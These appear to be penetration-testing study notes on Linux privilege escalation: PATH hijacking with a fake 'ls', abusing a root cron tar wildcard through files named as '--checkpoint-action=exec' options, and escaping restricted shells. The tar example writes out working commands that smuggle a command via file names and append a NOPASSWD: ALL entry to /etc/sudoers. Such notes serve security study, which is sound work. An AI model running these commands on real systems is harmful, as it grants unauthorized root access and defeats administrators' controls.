## [Path](https://www.linfo.org/path_env_var.html)Abuse
```shell
echo $PATH
```
### Adding variables to path 
```shell
PATH=.:${PATH}
$ export PATH
echo $PATH
```

```shell
touch ls
echo 'echo "PATH ABUSE!!"' > ls
chmod +x ls
```

```shell
ls

PATH ABUSE!!
```
## Wildcard Abuse 

| **Character** | **Significance**                                                                                                                                      |
| ------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------- |
| `*`           | An asterisk that can match any number of characters in a file name.                                                                                   |
| `?`           | Matches a single character.                                                                                                                           |
| `[ ]`         | Brackets enclose characters and can match any single one at the defined position.                                                                     |
| `~`           | A tilde at the beginning expands to the name of the user home directory or can have another username appended to refer to that user's home directory. |
| `-`           | A hyphen within brackets will denote a range of characters.                                                                                           |
### tar
The `--checkpoint-action` option permits an `EXEC` action to be executed when a checkpoint is reached
#### Example Cron
```shell
*/01 * * * * cd /root && tar -zcf /tmp/backup.tar.gz *
```
Leverage the wildcard.
```shell
echo 'echo "cliff.moore ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > --checkpoint=1
```

```shell
ls -la

total 56
drwxrwxrwt 10 root        root        4096 Aug 31 23:12 .
drwxr-xr-x 24 root        root        4096 Aug 31 02:24 ..
-rw-r--r--  1 root        root         378 Aug 31 23:12 backup.tar.gz
-rw-rw-r--  1 cliff.moore cliff.moore    1 Aug 31 23:11 --checkpoint=1
-rw-rw-r--  1 cliff.moore cliff.moore    1 Aug 31 23:11 --checkpoint-action=exec=sh root.sh
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .font-unix
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .ICE-unix
-rw-rw-r--  1 cliff.moore cliff.moore   60 Aug 31 23:11 root.sh
```
Once the cronjob runs the wildcard will run :
```shell
backup.tar.gz --checkpoint=1 --checkpoint-action=exec=sh root.sh 
```
## Escaping Restricted Shells
* Restricted shell limits the users ability to execute commands. 
* User is only allowed to execute a specific set of commands or only allowed to execute commands in specific directories
### Examples
#### RBASH
**[Restricted Bourne Shell](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)**
* Can limits the users ability to use certain features of the Bourne Shell, such as changing directories, executing commands etc...
#### RKSH
**[Restricted Korn Shell](https://www.ibm.com/docs/en/aix/7.2?topic=r-rksh-command)**
* Restricted version of the Korn Shell.
* Can limit the users ability to use certain features of the Korn shell.
#### RZSH
**[Restricted Z Shell](https://manpages.debian.org/experimental/zsh/rzsh.1.en.html)**
* Administrators often use this limit users who may accidentally or intentionally damage the system. 
### Escaping
#### Command Injection
* May be able to inject commands within allowed commands. 
* If you are allowed to use the `ls` binary try:
```shell
ls -l 'pwd'
```
#### Command Substitution
* Using the shells command substitution to execute a command.  
##### Example
* If the shell allows commands executed by enclosing them in backticks:
```
`
```
* It may be possible to escape from the shell by executing a command in a back tick substitution
#### Command Chaining
* Chain commands together with `|` or `;` etc...
#### Environmental Variables
* Modifying or creating environmental variables that the shell uses to execute commands. 
#### Shell functions
* May be possible to call shell function that executes commands. 